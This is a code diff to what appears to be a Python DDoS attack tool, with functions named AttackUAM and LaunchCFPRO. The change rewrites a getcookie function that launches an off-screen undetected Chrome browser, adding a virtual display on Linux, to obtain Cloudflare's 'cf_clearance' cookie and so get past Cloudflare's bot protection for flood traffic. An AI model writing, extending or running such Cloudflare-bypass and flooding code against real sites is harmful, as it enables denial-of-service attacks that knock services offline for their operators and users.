@@ -4,6 +4,7 @@ import os, threading, requests, cloudscraper, datetime, time, socket, socks, ssl
 from urllib.parse import urlparse
 from requests.cookies import RequestsCookieJar
 import undetected_chromedriver as webdriver
+from pyvirtualdisplay import Display
 from sys import stdout
 from colorama import Fore, init
 init(convert=True)
@@ -147,30 +148,38 @@ def AttackUAM(url, until_datetime, scraper):
 
 #region CFPRO
 def getcookie(url):
-	global cookies
-	options = webdriver.ChromeOptions()
-	options.add_argument('--no-first-run --no-service-autorun --password-store=basic')
-	options.add_argument('--disable-gpu')
-	options.add_argument('--disable-dev-shm-usage')
-	options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36')
-	options.add_argument('--incognito')
-	options.add_argument('--keep-alive-for-test')
-	options.add_argument("--window-position=-5000,0")
-	driver = webdriver.Chrome(options=options)
-	driver.implicitly_wait(3)
-	driver.get(url)
-	ii = 0
-	while ii == 0:
-		cookies = driver.get_cookies()
-		for i in cookies:
-			if i['name'] == "cf_clearance":
-                #print("Found")
-				driver.quit()
-				ii += 1
-			else:
-				pass
-		time.sleep(0.2)
-	driver.quit()
+    global cookies
+    linux = False
+    if name == 'nt':
+        pass
+    else:
+        linux = True
+        disp = Display(size=(100,60))
+        disp.start()
+    options = webdriver.ChromeOptions()
+    options.add_argument('--no-first-run --no-service-autorun --password-store=basic')
+    options.add_argument('--disable-gpu')
+    options.add_argument('--disable-dev-shm-usage')
+    options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36')
+    options.add_argument('--incognito')
+    options.add_argument('--keep-alive-for-test')
+    options.add_argument("--window-position=-5000,0")
+    driver = webdriver.Chrome(options=options)
+    driver.implicitly_wait(3)
+    driver.get(url)
+    ii = 0
+    while ii == 0:
+        cookies = driver.get_cookies()
+        for i in cookies:
+            if i['name'] == "cf_clearance":
+                driver.quit()
+                ii += 1
+            else:
+                pass
+        time.sleep(0.2)
+    driver.quit()
+    if linux:
+        disp.stop()
 
 
 def LaunchCFPRO(url, th, t):
